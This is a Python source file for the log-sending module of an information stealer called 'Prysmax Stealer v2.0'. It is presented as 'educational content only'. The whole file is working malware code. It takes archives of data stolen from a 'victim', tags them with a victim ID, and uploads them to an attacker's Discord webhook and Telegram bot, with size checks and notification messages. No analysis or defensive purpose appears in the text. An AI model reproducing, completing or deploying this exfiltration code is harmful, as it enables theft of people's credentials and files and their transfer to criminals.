#!/usr/bin/env python3
"""
Prysmax Log Sender Module
Educational content only
"""

import os
import sys
import json
import requests
from datetime import datetime

class LogSender:
    def __init__(self, config):
        self.config = config
        self.webhook_url = config.get("stealer", {}).get("webhook_url", "")
        self.discord_webhook = config.get("stealer", {}).get("discord_webhook", "")
        self.telegram_bot_token = config.get("stealer", {}).get("telegram_bot_token", "")
        self.telegram_chat_id = config.get("stealer", {}).get("telegram_chat_id", "")
        
    def send_archive(self, archive_path, victim_id):
        """Send archive to configured endpoints"""
        try:
            if self.discord_webhook:
                self.send_to_discord(archive_path, victim_id)
            
            if self.telegram_bot_token and self.telegram_chat_id:
                self.send_to_telegram(archive_path, victim_id)
                
        except Exception as e:
            print(f"[SENDER] Error sending logs: {e}")
    
    def send_to_discord(self, archive_path, victim_id):
        """Send logs to Discord webhook"""
        try:
            if not self.discord_webhook:
                return
            
            # Get file size
            file_size = os.path.getsize(archive_path)
            file_size_mb = file_size / (1024 * 1024)
            
            # Create embed
            embed = {
                "title": "🔥 Prysmax Stealer - New Victim",
                "description": f"**Victim ID:** `{victim_id}`",
                "color": 0x8b5cf6,
                "fields": [
                    {
                        "name": "📊 Archive Info",
                        "value": f"**Size:** {file_size_mb:.2f} MB\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "Prysmax Stealer v2.0",
                    "icon_url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
                },
                "timestamp": datetime.now().isoformat()
            }
            
            # Send message with file
            if file_size < 8 * 1024 * 1024:  # 8MB Discord limit
                with open(archive_path, 'rb') as f:
                    files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                    data = {
                        'embeds': [embed]
                    }
                    
                    response = requests.post(
                        self.discord_webhook,
                        data={'payload_json': json.dumps(data)},
                        files=files,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        print("[SENDER] Successfully sent to Discord")
                    else:
                        print(f"[SENDER] Discord error: {response.status_code}")
            else:
                # File too large, send without attachment
                data = {
                    'embeds': [embed]
                }
                
                response = requests.post(
                    self.discord_webhook,
                    json=data,
                    timeout=30
                )
                
                print("[SENDER] File too large for Discord, sent notification only")
                
        except Exception as e:
            print(f"[SENDER] Discord error: {e}")
    
    def send_to_telegram(self, archive_path, victim_id):
        """Send logs to Telegram bot"""
        try:
            if not self.telegram_bot_token or not self.telegram_chat_id:
                return
            
            # Send message
            message = f"🔥 *Prysmax Stealer - New Victim*\n\n"
            message += f"**Victim ID:** `{victim_id}`\n"
            message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"**Archive:** {os.path.basename(archive_path)}"
            
            # Send text message
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {
                'chat_id': self.telegram_chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=30)
            
            # Send file if small enough
            file_size = os.path.getsize(archive_path)
            if file_size < 50 * 1024 * 1024:  # 50MB Telegram limit
                url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument"
                
                with open(archive_path, 'rb') as f:
                    files = {'document': f}
                    data = {
                        'chat_id': self.telegram_chat_id,
                        'caption': f"Archive from {victim_id}"
                    }
                    
                    response = requests.post(url, data=data, files=files, timeout=60)
                    
                    if response.status_code == 200:
                        print("[SENDER] Successfully sent to Telegram")
                    else:
                        print(f"[SENDER] Telegram error: {response.status_code}")
            
        except Exception as e:
            print(f"[SENDER] Telegram error: {e}")
    
    def send_notification(self, message):
        """Send simple notification"""
        try:
            if self.discord_webhook:
                data = {
                    'content': message
                }
                requests.post(self.discord_webhook, json=data, timeout=10)
            
            if self.telegram_bot_token and self.telegram_chat_id:
                url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
                data = {
                    'chat_id': self.telegram_chat_id,
                    'text': message
                }
                requests.post(url, data=data, timeout=10)
                
        except Exception as e:
            print(f"[SENDER] Notification error: {e}")

